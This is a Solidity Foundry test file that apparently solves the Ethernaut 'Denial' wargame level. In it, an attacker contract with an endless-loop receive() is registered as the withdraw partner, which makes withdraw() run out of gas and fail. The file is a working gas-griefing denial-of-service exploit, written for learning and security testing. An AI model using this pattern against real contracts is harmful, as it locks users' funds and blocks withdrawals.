// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/20_Denial.sol";
contract DenialAttack {
    receive() external payable{
        while(true){}
    }
}
contract DenialTest is Test {
    Denial denial;
    DenialAttack denialAttack;
    address hacker = address(0x1337);
    function setUp() public {
       denial = new Denial();
       denialAttack = new DenialAttack();
       vm.deal(address(denial), 1 ether);
       vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        denial.setWithdrawPartner(address(denialAttack));
        (bool success, ) = address(denial).call{gas: 1000000}(
            abi.encodeWithSignature("withdraw()")
        );
        assertFalse(success);
        vm.stopPrank();
    }
}
